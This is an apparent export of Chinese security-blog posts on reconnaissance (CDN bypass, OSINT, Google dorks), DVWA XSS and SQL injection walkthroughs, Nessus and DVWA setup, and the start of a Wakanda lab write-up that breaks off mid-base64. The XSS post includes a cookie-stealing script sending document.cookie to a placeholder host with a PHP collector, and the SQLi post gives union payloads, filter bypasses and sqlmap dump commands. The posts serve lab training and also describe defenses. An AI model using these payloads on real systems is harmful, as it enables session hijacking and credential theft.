常见CMS有Dedecms(织梦)、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCNMS、帝国、Z-Blog、WordPress等 常用工具有：御剑whatweb、webrobo、椰树、轻量web指纹识别等 在线查询CMS指纹网站： BugScaner：http://whatweb.bugscaner.com/ 云悉指纹：http://www.yunsee.cn/finger.html WhatWeb：https://www.whatweb.net/ 获取真实IP一般目标网站只有一个域名，但是对应的真实IP有时会很难确定 CDN(内容分发网络)，主要解决因传输距离和不同运营商节点造成的网络速度性能低下问题。就是在一组不同运营商之间的对接节点上的高速缓存服务器，将用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户最近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程服务器上进行响应，可以大大提高网站响应速度及用户体验 若目标网站使用CDN服务，直接ping域名，得到的不是目标真正IP地址，而只是距离近的CDN服务器 判断目标是否使用CDN利用在线网站17CE(https://www.17ce.com/)，进行全国多地区的`ping`服务器操作，通过判断各地区的`ping`结果，判断是否使用`CDN` 若IP地址相同，极可能不存在CDN 若IP大多不一样或规律性很强，可以尝试查询这些IP的归属地，判断是否使用CDN 绕过CDN 内部邮箱源。一般邮件系统处于内部，没有经过CDN解析，通过网站用户注册或者RSS订阅功能，查看邮件头中的邮件服务器域名，以此域名获取真实IP 扫描网站测试文件。如phpinfo、test等 分站域名。很多网站主站会使用CDN，但分站可能并没有使用CDN。通过分站域名获取分站IP，可能存在分站与主站不是同一IP，但是属于同一IP段的情况 国外访问。国内CDN通常只会针对国内用户提供访问加速。可以通过国外在线代理网站App Synthetic Monitor(https://asm.ca.com/zh_cn/ping.php) 访问，可能会获取真实IP 查询域名解析记录。可能目标网站以前并没有使用CDN，可以通过NETCRAFT(https://www.netcraft.com/) 来观察域名的IP历史记录，可以大致分析出目标真实IP段 目标网站APP。若目标网站有APP，可以利用Burp Suite抓取APP请求，查找目标真实IP 绕过CloudFlare CDN查找真实IP。很多网站使用CloudFlare提供CDN服务，可以尝试通过在线网站CloudFlareWatch(http://www.crimeflare.org:82/) 对网站进行真实IP查询 验证IP的真实性 查看域名访问与IP访问的页面返回状态是否一致 对于IP段，可以批量扫描IP段中开启常见web端口的主机，对其进行访问以判断 收集敏感文件目录探测web目录结构和隐藏的敏感文件可以获取网站后台管理界面、文件上传界面，甚至可以获取到网站的源代码 针对网站目录的扫描有：DirBuster、御剑后台扫描珍藏版、wwwscan、spinder.py、Sensitivefilescan、Weakfilescan等]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集--被动]]></title>
    <url>%2F2019%2F05%2F14%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[越是了解测试目标，测试的工作越容易 要求 从公开渠道获得目标信息 与目标系统不产生直接的交互 尽量避免留下一切痕迹 公开资源情报计划Open source intelligence，简称OSINT 是美国中央情报局(CIA)的一种情报搜集手段，从各种公开的信息资源中寻找和获取有价值的情报 被动信息收集内容 IP地址段 域名、子域名信息 邮件地址 文档图片数据 公司地址 公司组织架构 联系电话 人员姓名/职务 公开的商业信息 被动信息收集用途 描述目标 社会工程学攻击 查找物理缺口 DNS信息收集DNS用于域名解析为IP地址 FQDN：完全限定域名，www.baidu.com 域名：baidu.com 域名记录： A记录：主机记录，用于将一个域名解析到一个IP地址上 C name记录：别名记录，将一个域名解析到另一个域名上 NS记录：定义和注册域名服务器地址 MX记录：邮件交换记录 ptr记录：通过IP地址反向解析域名 AAAA记录：IPv6下的A记录 域名解析查询NSLOOKUP 直接解析 12nslookup&gt; www.baidu.com 设置查询域名记录类型 12&gt; set q=mx 等同于set type=mx&gt; set q=any 设置自定义域名服务器 1&gt; server 114.114.114.114 组合查询 DIG 常规查询 1dig baidu.com any @114.114.114.114 路由追踪 1dig +trace www.baidu.com 子域名信息在线查询 https://searchdns.netcraft.com/ Google语法：site:xxx.com 许多第三方服务汇聚大量DNS数据集 DNSdumpster网站（https://dnsdumpster.com） 子域名爆破网站（https://phpinfo.me/domain） IP反查绑定域名网站（http://dns.aizhan.com） 子域名检测工具 Layer子域名挖掘机 K8 wydomain Sublist3r dnsmaper subDomainsBrute 可递归查询三级、四级、五级域名 python subDomainsbrute.py xxx.com Maltego CE DNS注册信息whoiswhois用于查询域名是否已被注册以及注册域名的详细信息的数据库（域名所有人、域名注册商等） kali中默认集成whois 在线whois查询工具有： 爱站工具网（https://whois.aizhan.com） 站长之家（http://whois.chinaz.com） VirusTotal（https://www.virustotal.com） 域名备案信息根据国家法律规定，网站所有者需要向国家有关部门申请备案。主要针对国内网站，若网站服务器搭建在其他国家，则不需要备案 ICP备案查询网（http://www.beianbeian.com） 天眼查（http://www.tianyancha.com） 证书透明度公开日志枚举证书透明度（CT），是证书授权机构CA的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中 一个SSL/TLS证书通常包含域名、子域名和邮件地址 ctr.sh（https://crt.sh） censys（https://censys.io） 搜索引擎google hacking intext:(仅google)——搜索正文内容 intitle:——搜索标题内容 cache:——搜索搜索引擎缓存内容 inurl:——搜索特定URL site:——指定搜索特定的站点 filetype:——指定访问的文件类型 link:——指定链接的网页 related:——搜索相似类型的网页 info:——返回站点的指定信息 define:——返回某个词语的定义 index of——发现允许目录浏览的web网站 双引号：代表完全匹配搜索 加号：搜索包含加号后面词的页面 减号：代表搜索不包含减号后面的词的页面 星号：通配符 Google hacking大全：https://www.exploit-db.com/google-hacking-database 网络搜索组件 shodan:https://www.shodan.io/ shodan可以搜索网络空间中的所有联网设备，包括服务器、电脑、手机、摄像头等 zoomeye(钟馗之眼):https://www.zoomeye.org/ ZoomEye是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息。 ZoomEye拥有两大探测引擎：Xmap和Wmap，分别针对网络空间中的设备及网站，通过24小时不间断的探测、识别，标识出互联网设备及网站所使用的服务及组件。研究人员可以通过ZoomEye方便的了解组件的普及率及漏洞的危害范围等信息 fofa:https://fofa.so/ 网络空间资产检索系统(FOFA)探索全球互联网的资产信息，进行资产及漏洞影响范围分析、应用分布统计、应用流行度态势感知等 云悉:http://www.yunsee.cn WEB指纹扫描、CMS识别 maltego]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA1.10之XSS]]></title>
    <url>%2F2019%2F05%2F13%2FDVWA1-10%E4%B9%8BXSS%2F</url>
    <content type="text"><![CDATA[XSS简介XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。与前两种XSS相比，它最大的特点就是不与后台服务器交互，只是通过浏览器的DOM树解析产生 常见XSS利用方式&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt; &lt;img src=1 onerror=alert(&#39;xss&#39;)&gt; &lt;DIV style=&quot;background-image:url(javascript:alert(&#39;1&#39;))&quot;&gt; &lt;iframe onload=alert(1)&gt; &lt;table&gt;、&lt;a&gt;、&lt;ul&gt;等标签也可利用 反射型XSS LOW级别输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;，成功弹框 输入&lt;script&gt;alert(document.cookie)&lt;/script&gt;，获取cookie XSS的一般收集方式 设计XSS注入代码 1&lt;script&gt;document.location=&apos;http://xxx.com/xss/HACK.php?x=&apos;+document.cookie;&lt;/script&gt; 访问http://xxx.com/xss/HACK.php这个网址，并且通过x传递一个变量，即要收集的cookie 收集cookie HACK.php页面代码如下： 1234&lt;?php $cookie = $_GET[&apos;x&apos;]; file_put_contents(&apos;cookie.txt&apos;, $cookie);?&gt; Medium级别 输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;，失败 发现&lt;spirt&gt;标签被过滤 双写绕过过滤 输入&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;)&lt;/script&gt;,成功弹窗 大小写混淆绕过 输入&lt;ScRipt&gt;alert(&#39;xss&#39;)&lt;/script&gt;，成功弹窗 High级别查看源代码 High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效 输入&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;，成功弹框 输入&lt;iframe src=1 onload=alert(&#39;xss&#39;)&gt;，成功弹窗 Impossible级别查看源代码 Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、&quot;、&#39;、&lt;、&gt;转换为 HTML实体，防止浏览器将其作为HTML元素 存储型XSS LOW级别查看源代码 message一栏输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;，成功弹框 name一栏前端有字数限制，抓包改为&lt;script&gt;alert(&#39;name&#39;)&lt;/script&gt;,成功弹窗 相关函数介绍 trim(string,charlist)函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符 mysql_real_escape_string(string,connection)函数会对字符串中的特殊符号（\x00，\n，\r，\，&#39;，&quot;，\x1a）进行转义 stripslashes(string)函数删除字符串中的反斜杠 Medium级别查看源代码 对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型XSS 双写绕过 抓包改name参数为&lt;sc&lt;script&gt;ript&gt;alert(&#39;xss&#39;)&lt;/script&gt;，成功弹窗 大小写混淆绕过 抓包改name参数为&lt;Script&gt;alert(&#39;xss&#39;)&lt;/script&gt;，成功弹窗 相关函数说明 strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b&gt;标签 addslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串 High级别查看源代码 name使用正则表达式过滤了&lt;script&gt;标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS 抓包改name参数为&lt;img src=1 onerror=alert(1)&gt; Impossible级别查看源代码 通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS DOM型XSSLOW级别页面本意是用于修改语言 对default参数进行构造&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; 查看网页源代码，JS脚本插入到&lt;option&gt;标签中，被执行 Medium级别查看源代码 使用了stripos 用于检测default值中是否有 &lt;script，如果有的话，则将default=English 对default参数进行构造&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;,失败 查看源代码 发现JS语句被插入为&lt;option&gt;的value值，未被执行 要使JS语句执行，应先闭合&lt;option&gt;标签 对default参数进行构造&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt; 执行失败，查看源代码 JS代码被执行为&lt;option value=&quot;&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;&quot;&gt;&gt;&lt;/option&gt; JS代码中只有&gt;被插入到option标签的值中，因为&lt;/option&gt;闭合了&lt;option&gt;标签，所以&lt;img&gt;标签并没有插入 继续闭合&lt;select&gt;标签，使得&lt;img&gt;标签为独立的语句 对default参数进行构造&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;，成功弹框 查看源代码，JS代码已被执行 High级别查看源代码 使用switch设置白名单，只允许传的default值为 French、English、German、Spanish其中一个 构造语句为?default=English #&lt;script&gt;alert(/xss/)&lt;/script&gt; 写入效果为 1&lt;option value=&apos;&apos;&gt;English #&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/option&gt; 注释部分的javascript代码不会被传到服务器端，DOM型XSS注入直接获取URL地址内容，则被执行 Impossible级别不在客户端做任何事 XSS防御 对输入和URL参数进行过滤(白名单/黑名单) 对输出进行编码 在服务器端对Cookie设置HttpOnly属性 使用自动编码的安全框架 使用内容安全策略(CSP)]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>DVWA1.10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA1.10之SQL注入]]></title>
    <url>%2F2019%2F05%2F12%2FDVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[SQL注入简介SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一 手工注入思路 判断是否存在注入，注入是字符型还是数字型 当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入 当输入的参数为字符串时，如果存在注入漏洞，可以认为是字符型注入 字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的 猜解SQL查询语句中的字段数 获取当前数据库 获取数据库中的表 获取表中的列名(字段名) 获取数据记录 LOW级别漏洞利用判断是否存在注入，注入是字符型还是数字型 输入1，查询成功 输入&#39;，出现报错 显示数据库为MariaDB，即mysql 输入1&#39; and &#39;1&#39;=&#39;1，返回正常 输入1&#39; and &#39;1&#39;=&#39;2，无返回 可进行逻辑运算，且出现数据库报错，此为基于报错的SQL注入 需使用&#39;引号来进行闭合，为字符型SQL注入 可猜出查询语句为select [字段1,字段2,...] from 表 where 字段=&#39;&#39;; 猜解SQL查询语句中的字段数 输入1&#39; order by 1--，返回正常 输入1&#39; order by 2--，返回正常 输入1&#39; order by 3--，出现报错 说明执行的SQL查询语句中只有两个字段(即查询一个数据表中的两列)，即这里的First name、Surname 可猜出查询语句为select 字段1,字段2 from 表 where 字段=&#39;&#39;; 获取当前数据库输入1&#39; union select 1,database()-- 说明当前查询的数据库为dvwa 获取dvwa数据库中的表information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如：数据库名，数据库的表，列的数据类型与访问权限等 information_schema数据库的table表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个数据库，表类型，表引擎，创建时间等信息 输入1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;-- 说明dvwa数据库中存在guestbook，users两张表 可猜出查询语句为select 字段1,字段2 from users where 字段=&#39;&#39;; 获取dvwa库users表中的列名information_schema数据库的columns表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息 输入1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;-- 发现dvwa库users表中有8列(即字段)，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login 可猜出查询语句为select first_name,last_name from users where user_id=&#39;&#39;; 获取数据记录输入1&#39; union select group_concat(user_id,first_name,last_name),group_concat(password) from users-- 则得到了dvwa库中users表中所有用户的user_id,first_name,last_name,password的数据 Medium级别漏洞利用判断是否存在注入，注入是字符型还是数字型前端使用下拉框限制输入参数 可以使用BurpSuite进行抓包修改输入参数 改包，使输入为&#39; 报错 发现对&#39;进行了转义处理 改包，使输入为1&#39; and &#39;1&#39;=&#39;1 报错 改包，使输入为1 and 1=1 正常返回 改包，使输入为1 and 1=2 无返回 可进行逻辑运算，且出现数据库报错，此为基于报错的SQL注入，但对&#39;等特殊符号进行转义 无需使用&#39;引号来进行闭合，为数字型SQL注入 由于是数字型注入，服务器端对特殊字符的转义就形同虚设了，因为数字型注入并不需要借助引号 可猜出查询语句为select [字段1,字段2,...] from 表 where 字段= ; 猜解SQL查询语句中的字段数 改包，使输入为1 order by 2-- 改包，使输入为1 order by 3-- 报错 说明执行的SQL查询语句中只有两个字段(即查询一个数据表中的两列)，即这里的First name、Surname 可猜出查询语句为select 字段1,字段2 from 表 where 字段= ; 获取当前数据库改包，使输入为1 union select 1,database()-- 说明当前的数据库为dvwa 获取dvwa数据库中的表改包，使输入为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- 说明dvwa数据库中存在guestbook，users两张表 可猜出查询语句为select 字段1,字段2 from users where 字段= ; 获取dvwa库users表中的列名 改包，使输入为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;-- 查询失败 因对&#39;等特殊字符进行了转义，所以查询失败 使用十六进制对过滤进行绕过 使用BurpSuite将users转换为十六进制0x7573657273 改包，使输入为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273-- 发现dvwa库users表中有8列(即字段)，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login 可猜出查询语句为select first_name,last_name from users where user_id= ; 获取数据记录改包，使输入为1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users-- 则得到了dvwa库中users表中所有用户的user_id,first_name,last_name,password的数据 High级别漏洞利用判断是否存在注入，注入是字符型还是数字型High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入 High级别在low级别的基础上，在SQL查询语句后加入LIMIT 1，用于希望以此控制只输出一个结果，可通过--注释符来进行注释 High级别对数据库报错进行了处理，显示统一的报错信息 与low级别的注入基本相似 Impossible级别Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性 PHP数据对象（PDO）扩展为PHP访问数据库定义了一个轻量级的一致接口 PDO提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据 SQL注入防御 所有的查询语句都使用数据库提供的参数化查询接口 对进入数据库的特殊字符(&#39;，&quot;，select，union，--，#，order by)进行转义处理，或编码转换 严格限制数据类型 严格限制参数长度 网站每个数据层的编码统一，建议UTF-8 严格限制网站用户的数据库的操作权限，最小权限原则 统一错误信息提示 使用预编译语句 使用存储过程 白名单验证输入 SQLMAP爆数据库1python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; --dbs --batch 爆表1python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa --tables --batch 爆字段1python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa -T users --column --batch 爆数据1python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa -T users -C user,password --dump --batch]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>DVWA1.10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali下安装nessus]]></title>
    <url>%2F2019%2F05%2F11%2Fkali%E4%B8%8B%E5%AE%89%E8%A3%85nessus%2F</url>
    <content type="text"><![CDATA[下载下载地址： https://www.tenable.com/downloads/nessus 选择对应的安装包 安装1dpkg -i Nessus-8.3.2-ubuntu910_amd64.deb 启动1/etc/init.d/nessusd start 访问1https://127.0.0.1:8834 信任该地址 设置用户名、密码 激活 在线获取激活码访问 https://www.tenable.com/products/nessus/activation-code 填写名称、邮箱 下一步后，邮箱会收到一封邮件，其中包含有激活码 填写到上方激活码的填写位置，即可激活家庭免费版 之后就会自动进行插件的下载、安装 离线获取激活码在内网主机完成程序安装后由于无法访问外网，所以需要离线激活 获取设备代码 选择offline选项，并复制设备代码 也可通过 12cd /opt/nessus/sbin./nessuscli fetch --challenge 获取设备代码 获取激活码 访问 https://www.tenable.com/products/nessus/activation-code 填写名称、邮箱 下一步后，邮箱会收到一封邮件，其中包含有激活码 获取离线激活码 访问 https://plugins.nessus.org/v2/offline.php 上方填写设备代码，下方填写邮件收到的激活码 下一步后，会获取license文本及nessus.license文件 注意，需同时下载上方红框中的离线插件安装包，用于后续离线安装插件 将license文本复制，填写到激活界面 即可完成离线激活 接下来会进行插件的下载、安装过程，但因无法连接外网，所以插件下载并不会成功 插件问题Nessus扫描器在先部署完成时，一般在输入激活码以后会自动在线下载插件包进行更新，但是有时候因为诸多原因如网络不稳定、磁盘空间不足或人为中止了插件下载等，都会导致插件更新失败，另外因没网络选择离线部署时也需要单独更新插件，这时就需要手动下载插件并更新 此时应进行离线插件安装，这时就需要上方提前下载的离线插件安装包 12cd /opt/nessus/sbin/./nessuscli update ~/all-2.0.tar.gz 重新启动 1./nessusd 访问https://127.0.0.1:8834，输入前面设置的用户名、密码即可]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA靶机]]></title>
    <url>%2F2019%2F05%2F05%2FDVWA%E9%9D%B6%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[环境准备以64位环境为例 操作系统CentOS-7-x86_64-Minimal-2009 中间件、数据库等使用xampp完整包集成环境 下载https://www.apachefriends.org/zh_cn/download.html 安装12chmod +x xampp-linux-x64-5.6.23-0-installer.run./xampp-linux-x64-5.6.23-0-installer.run 基础配置 兼容性问题 1vi /opt/lampp/lampp 将export LD_ASSUME_KERNEL=2.2.5修改为export LD_ASSUME_KERNEL=2.8.0 安装net-tools 1rpm -ivh net-tools-2.0-0.25.20131004git.el7.x86_64.rpm 启动12cd /opt/lampp/./lampp start 会提示ok，启动成功 配置安全性设置1./lampp security 设置XAMPP pages的密码 重启mysql 设置mysql/phpadmin用户pma的密码 设置mysql用户root的密码 设置ftp用户daemon的密码 重启服务 1./lampp restart 访问设置 设置ServerName 12cd /opt/lampp/etc/vi httpd.conf 修改ServerName行,设置为： 1ServerName localhost:80 重启服务 12cd /opt/lampp/./lampp restart 开放防火墙80端口 12firewall-cmd --zone=public --add-port=80/tcp --permanentfirewall-cmd --reload 同网络下主机即可访问 配置dvwa靶机部署 安装unzip 1rpm -ivh unzip-6.1c-3.1.mga7.x86_64.rpm 解压dvwa源码 1unzip DVWA-master.zip -d /opt/lampp/htdocs/ 设置访问 更改网站根目录 1vi /opt/lampp/etc/httpd.conf 将DocumentRoot &quot;/opt/lampp/htdocs&quot;更改为DocumentRoot &quot;/opt/lampp/htdocs/DVWA-master&quot; 设置dvwa配置文件 12cd /opt/lampp/htdocs/DVWA-master/configcp config.inc.php.dist config.inc.php 重启lampp服务即可访问 配置DVWA PHP function allow_url_include: Disabled 1vi /opt/lampp/etc/php.ini 将allow_url_include=Off改为allow_url_include=On reCAPTCHA key: Missing 1vi /opt/lampp/htdocs/DVWA-master/config/config.inc.php 将 12$_DVWA[ &apos;recaptcha_public_key&apos; ] = &apos;&apos;;$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;&apos;; 改为： 12$_DVWA[ &apos;recaptcha_public_key&apos; ] = &apos;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&apos;;$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&apos;; Unable to connect to the database. 1vi /opt/lampp/htdocs/DVWA-master/config/config.inc.php 将$_DVWA[ &#39;db_password&#39; ] = &#39;&#39;;中的值改为自己mysql的root用户的密码 对目录无可写权限 123chmod 757 /opt/lampp/htdocs/DVWA-master/hackable/uploads/chmod 646 /opt/lampp/htdocs/DVWA-master/external/phpids/0.6/lib/IDS/tmp/phpids_log.txtchmod 757 /opt/lampp/htdocs/DVWA-master/config 重启服务 12cd /opt/lampp/./lampp restart 刷新页面即可 开始使用点击Create/Reset Database后会创建数据库 报错： 默认安装的是MariaDB数据库，并不是Mysql，不能按照Mysql的配置来不然会报错 解决： 停止lampp服务 12cd /opt/lampp/./lampp stop 删除一些缓存文件 12rm -rf /opt/lampp/var/mysql/VM_* # 删除mysql相关缓存rm -rf /opt/lampp/var/proftpd.pid # 删除proftp相关缓存 启动lampp服务 12cd /opt/lampp/./lampp start 启动进入mysql 12cd /opt/lampp/bin/./mysql -uroot -p 输入密码，进入 配置数据库 12345use mysql;create user dvwa;grant all on dvwa.* to dvwa@localhost identified by &apos;123456&apos;;flush privileges;exit 修改配置文件 1vi /opt/lampp/htdocs/DVWA-master/config/config.inc.php 将 1234$_DVWA[ &apos;db_server&apos; ] = &apos;127.0.0.1&apos;;$_DVWA[ &apos;db_database&apos; ] = &apos;dvwa&apos;;$_DVWA[ &apos;db_user&apos; ] = &apos;root&apos;;$_DVWA[ &apos;db_password&apos; ] = &apos;123456&apos;; 修改为： 1234 $_DVWA[ &apos;db_server&apos; ] = &apos;localhost&apos;;$_DVWA[ &apos;db_database&apos; ] = &apos;dvwa&apos;;$_DVWA[ &apos;db_user&apos; ] = &apos;dvwa&apos;;$_DVWA[ &apos;db_password&apos; ] = &apos;123456&apos;; 重启lampp服务即可 配置全部结束，即可登陆，默认用户名admin，密码password 设置环境开机自启 创建启动文件 12cd /lib/systemd/system/vi /lib/systemd/system/lampp.service 文件内容如下： 12345678910111213[Unit] # 服务的说明Description=lampp # 描述服务After=network.target # 描述服务类别 [Service] # 服务运行参数的设置Type=forking # 后台运行的形式ExecStart=/opt/lampp/lampp start # 服务的具体运行命令ExecReload=/opt/lampp/lampp restart # 重启命令ExecStop=/opt/lampp/lampp stop # 停止命令PrivateTmp=true # 表示给服务分配独立的临时空间 [Install] # 服务安装的相关设置，可设置为多用户WantedBy=multi-user.target 设置启动文件权限 1chmod 754 /lib/systemd/system/lampp.service 设置开机自启 1systemctl enable lampp.service 其他相关命令(与部署无关) 启动服务 1systemctl start lampp.service 取消开机自启 1systemctl disable lampp.service 查看服务状态 1systemctl status lampp.service 重启服务 1systemctl restart lampp.service 查看所有已启动的服务 1systemctl list-units --type=service]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>DVWA1.10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wakanda靶机]]></title>
    <url>%2F2019%2F05%2F03%2Fwakanda%E9%9D%B6%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[安装下载wakanda虚拟机.ova文件 下载地址：https://www.vulnhub.com/entry/wakanda-1,251/#download 导入 VirtualBox 攻击开始攻击机：kali 被攻击机：wakanda 网络模式：桥接 获取靶机IP 查看kali攻击机IP 1ifconfig 使用netdiscover工具进行网络扫描，找到靶机IP地址 1netdiscover -i eth0 枚举和初步搜索信息 使用nmap进行全端口扫描 1nmap -A -p- 192.168.43.57 靶机开放80(HTTP)、111(RPC)、3333(SSH)、57050(RPC)端口 访问80端口 无有用信息 使用dirb工具来进行目录遍历 1dirb http://192.168.43.57 访问扫描到的目录 /admin和/backup等目录，大小为0。 查看index页面源码,在页面注释中发现了lang参数 在?lang=fr中，lang表示可切换的网站语言，fr表示法语。我们尝试在HTTP URL中添加这个参数，切换语言为法语 利用LFI(本地文件包含漏洞)读取源码 使用PHP伪协议 1http://192.168.43.57/?lang=php://filter/convert.base64-encode/resource=index 1PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5l